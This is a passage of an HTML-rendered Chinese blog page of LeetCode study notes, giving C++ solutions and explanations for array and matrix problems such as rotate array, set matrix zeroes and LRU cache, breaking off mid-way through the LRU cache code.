class="title">sortColors</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[r]);</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[l]);</span><br><span class="line">                i++;<span class="comment">//注意</span></span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i]==<span class="number">1</span>)</span><br><span class="line">                i++;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="189-轮转数组"><a href="#189-轮转数组" class="headerlink" title="189 轮转数组"></a>189 轮转数组</h3><p>给定一个整数数组 nums，将数组中的【元素向右轮转 k 个位置】，其中 k 是非负数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//额外数组 res[(i+k)%n] = nums[i];</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> res[n];<span class="comment">//额外数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            res[(i+k)%n] = nums[i];<span class="comment">//关键！！！</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            nums[i] = res[i];<span class="comment">//z再赋给原来数组</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//nums.assign(res.begin(),res.end());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/936a1be179d44a7bb0dbfd3f4076482e.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//法二：数组翻转</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start&lt;end)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[start],nums[end]);</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k % n;</span><br><span class="line">        <span class="built_in">reverse</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums,<span class="number">0</span>,k<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums,k,n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="238 除自身以外数组的乘积"></a>238 除自身以外数组的乘积</h3><p>给你一个整数数组 nums，返回 数组 answer ，其中 answer[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积 。<br>题目数据 保证 数组 nums之中任意元素的全部前缀元素和后缀的乘积都在  32 位 整数范围内。<br>请不要使用除法，且在 O(n) 时间复杂度内完成此题。</p><p><strong>分析：使用除法运算</strong><br>这似乎是一个简单的问题，可以在线性时间和空间内解决。先计算给定数组所有元素的乘积，然后对数组中的每个元素 x，将总的乘积除以 x 来求得除自身值的以外数组的乘积。<br>然而这样的解决方法有一个问题，就是如果输入数组中出现 0，那么这个方法就失效了。而且在问题中说明了<code>不允许使用除法运算</code>。这增加了这个问题的难度。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">productExceptSelf</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">L</span><span class="params">(len,<span class="number">0</span>)</span>, <span class="title">R</span><span class="params">(len,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(len)</span></span>;</span><br><span class="line">        <span class="comment">// L[i] ：索引 i 左侧所有元素的乘积</span></span><br><span class="line">        L[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)</span><br><span class="line">            L[i] = nums[i<span class="number">-1</span>] * L[i<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">// R[i] ：索引 i 右侧所有元素的乘积</span></span><br><span class="line">        R[len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=len<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">            R[i] = nums[i+<span class="number">1</span>] * R[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">            res[i] = L[i]*R[i];<span class="comment">//结果</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="73-矩阵置零"><a href="#73-矩阵置零" class="headerlink" title="73 矩阵置零"></a>73 矩阵置零</h3><p>给定一个 m x n 的矩阵，如果一个元素为 0 ，则将其所在行和列的所有元素都设为 0 。请使用 原地 算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vector&lt;pair&lt;int,int&gt;&gt; vec;//存所有 0元素的下标</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setZeroes</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.<span class="built_in">size</span>(); <span class="comment">//m行 这里注意不要-1</span></span><br><span class="line">        <span class="keyword">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>(); <span class="comment">//n列</span></span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; vec;<span class="comment">//存所有 0元素的下标</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j]==<span class="number">0</span>)</span><br><span class="line">                    vec.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(i,j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;vec.<span class="built_in">size</span>();k++)&#123;</span><br><span class="line">            <span class="keyword">int</span> hang = vec[k].first;<span class="comment">//行下标</span></span><br><span class="line">            <span class="keyword">int</span> lie = vec[k].second;<span class="comment">//列下标</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;   </span><br><span class="line">                matrix[hang][i] = <span class="number">0</span>;<span class="comment">//行置0</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;   </span><br><span class="line">                matrix[j][lie]=<span class="number">0</span>;   <span class="comment">//列置0</span></span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="48-旋转图像"><a href="#48-旋转图像" class="headerlink" title="48 旋转图像"></a>48 旋转图像</h3><p>给定一个 <code>n × n</code> 的二维矩阵 matrix 表示一个图像。请你【将图像顺时针旋转 90 度】。<br>你必须在 原地 旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要 使用另一个矩阵来旋转图像。</p><p><strong>分析：</strong><br><strong>对于矩阵中第 i 行的第 j 个元素，在旋转后，它出现在倒数第 i 列的第 j 个位置。</strong><br><img src="https://img-blog.csdnimg.cn/0c45f01df1944b1fb390bde5b4be7024.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O(n^2) O(n^2)</span></span><br><span class="line"><span class="comment">//matrix_new[j][n-i-1] = matrix[i][j];</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = matrix.<span class="built_in">size</span>();<span class="comment">//本题 n*n</span></span><br><span class="line">        <span class="keyword">auto</span> matrix_new = matrix;<span class="comment">//值拷贝</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                matrix_new[j][n-i<span class="number">-1</span>] = matrix[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        matrix = matrix_new;<span class="comment">//值拷贝</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先以 中间行 为对称轴 上下交换</span></span><br><span class="line"><span class="comment">    再以从 左上至右下 的对角线为轴 交换元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">                <span class="built_in">swap</span>(matrix[i][j],matrix[n-i<span class="number">-1</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(matrix[i][j],matrix[j][i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="240-搜索二维矩阵-II"><a href="#240-搜索二维矩阵-II" class="headerlink" title="240 搜索二维矩阵 II"></a>240 搜索二维矩阵 II</h3><p>编写一个高效的算法来搜索 m x n 矩阵 matrix 中的一个目标值 target 。该矩阵具有以下<code>特性</code>：</p><pre><code>每行的元素从左到右升序排列。每列的元素从上到下升序排列。</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    lower_bound()针对已经升序排序的【二分查找】，某元素是否存在，返回其iterator</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">searchMatrix</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//row 是一个vector&lt;int&gt;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; row: matrix) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(row.<span class="built_in">begin</span>(), row.<span class="built_in">end</span>(), target);</span><br><span class="line">            <span class="keyword">if</span> (it != row.<span class="built_in">end</span>() &amp;&amp; *it == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针 最简便的！！！！</span></span><br><span class="line"><span class="comment">    O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">searchMatrix</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.<span class="built_in">size</span>();      <span class="comment">//行</span></span><br><span class="line">        <span class="keyword">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();   <span class="comment">//列</span></span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>, y = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;m &amp;&amp; y&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[x][y]==target)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(matrix[x][y] &gt; target)</span><br><span class="line">                y--;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                x++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="41-缺失的第一个正数"><a href="#41-缺失的第一个正数" class="headerlink" title="41 缺失的第一个正数"></a>41 缺失的第一个正数</h2><p>给你一个【未排序】的整数数组 nums ，请你找出其中【没有出现】的【最小的正整数】。<br>请你实现时间复杂度为 O(n) 并且只使用常数级别额外空间的解决方案。<br><img src="https://img-blog.csdnimg.cn/daa37d810cde4a4f896f12d4dcd967eb.png"></p><p><strong>分析：</strong><br>对于一个长度为 N 的数组，其中没有出现的最小正整数只能在 [1,N+1] 中。这是因为如果 [1,N] 都出现了，那么答案是 N+1，否则答案是 [1,N] 中没有出现的最小正整数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstMissingPositive</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i]&gt;=<span class="number">1</span> &amp;&amp; nums[i]&lt;=n &amp;&amp; nums[i]!=nums[nums[i]<span class="number">-1</span>])</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[nums[i]<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(nums[i]!=i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="146-LRU-缓存"><a href="#146-LRU-缓存" class="headerlink" title="146 LRU 缓存"></a>146 LRU 缓存</h3><p>请你设计并实现一个满足  LRU (最近最少使用) 缓存 约束的数据结构。<br>实现 LRUCache 类：</p><pre><code>LRUCache(int capacity) 以 正整数 作为容量 capacity 初始化 LRU 缓存int get(int key) 如果关键字 key 存在于缓存中，则返回关键字的值，否则返回 -1 。void put(int key, int value) 如果关键字 key 已经存在，则变更其数据值 value ；如果不存在，则向缓存中插入该组 key-value 。如果插入操作导致关键字数量超过 capacity ，则应该 逐出 最久未使用的关键字。</code></pre><p>函数 get 和 put 必须以 O(1) 的平均时间复杂度运行。<br><img src="https://img-blog.csdnimg.cn/a24fc0c46ba14ee894728b06ba9a2422.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表+双向链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> key,val;</span><br><span class="line">        Node *left,*right;</span><br><span class="line">        <span class="built_in">Node</span>():<span class="built_in">key</span>(<span class="number">0</span>),<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">left</span>(<span class="literal">NULL</span>),<span class="built_in">right</span>(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">        <span class="built_in">Node</span>(<span class="keyword">int</span> _key,<span class="keyword">int</span> _val):<span class="built_in">key</span>(_key),<span class="built_in">val</span>(_val),<span class="built_in">left</span>(<span class="literal">NULL</span>),<span class="built_in">right</span>(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>,Node*&gt; cache;</span><br><span class="line">    Node *head;</span><br><span class="line">    Node *tail;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">//head后插入p（头插法）</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insertNode</span><span class="params">(Node *p)</span></span>&#123;</span><br><span class="line">        p-&gt;right = head-&gt;right;</span><br><span class="line">        head-&gt;right = p;</span><br><span class="line">        p-&gt;left = head;</span><br><span class="line">        p-&gt;right-&gt;left = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除p</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(Node *p)</span></span>&#123;</span><br><span class="line">        p-&gt;left-&gt;right = p-&gt;right;</span><br><span class="line">        p-&gt;right-&gt;left = p-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将结点转移到 链表 头部，即head-&gt;next</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveToHead</span><span class="params">(Node *node)</span></span>&#123;</span><br><span class="line">        <span class="built_in">deleteNode</span>(node);</span><br><span class="line">        <span class="built_in">insertNode</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">LRUCache</span>(<span class="keyword">int</span> _capacity):<span class="built_in">capacity</span>(_capacity),<span class="built_in">size</span>(<span class="number">0</span>) &#123;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="built_in">Node</span>();<span class="comment">//伪头部——则真正有 数据的头结点是 head-&gt;right</span></span><br><span class="line">        tail = <span class="keyword">new</span> <span class="built_in">Node</span>();<span class="comment">//伪尾部——则真正有 数据的尾结点是 tail-&gt;left</span></span><br><span class="line">        head-&gt;right = tail;</span><br><span class="line">        tail-&gt;left = head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除最后一个结点</span></span><br><span class="line">    <span class="function">Node* <span class="title">removeTail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Node *node = tail-&gt;left;<span class="comment">//删去最后一个结点</span></span><br><span class="line">        <span class="built_in">deleteNode</span>(node);</span><br><span class="line">        <span class="keyword">return</span> node;<span class="comment">//返回被删结点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!cache.<span class="built_in">count</span>(key))<span class="comment">//没找到，返回-1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//key存在，查 hash</span></span><br><span class="line">        Node *node = cache[key];</span><br><span class="line">        <span class="built_in">moveToHead</span>(node);<span class="comment">//将结点转移至头部（最近访问过），排在链表越后面，越久未访问，则可以用于置换更新</span></span><br><span class="line">        <span class="keyword">return</span> node-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!cache.<span class="built_in">count</span>(key))&#123;<span class="comment">//不存在</span></span><br><span class="line">            <span class="comment">//创建新结点 存入 哈希表</span></span><br><span class="line">            Node *node = <span class="keyword">new</span> <span class="built_in">Node</span>(key,value);</span><br><span class="line">            cache[key] = node;</span><br><span class="line">            <span class="comment">//添加到双向链表头部</span></span><br><span class="line">            <span class="built_in">insertNode</span>(node);</span><br><span class="line">            size++;</span><br><span class="line">            <span 